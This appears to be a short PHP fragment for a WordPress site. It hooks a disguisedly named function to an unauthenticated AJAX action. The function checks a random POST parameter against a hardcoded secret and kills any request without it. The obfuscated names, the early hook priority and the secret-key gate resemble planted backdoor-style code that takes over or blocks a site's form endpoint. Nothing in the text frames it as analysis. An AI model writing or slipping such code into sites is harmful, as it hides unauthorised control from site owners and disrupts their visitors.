<?php

function mini_description_woff2() {
	if (!isset($_POST["bvbkkyuenph"]) || $_POST["bvbkkyuenph"] !== "tTjvyH5lZwt6") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'mini_description_woff2', 5, 1);
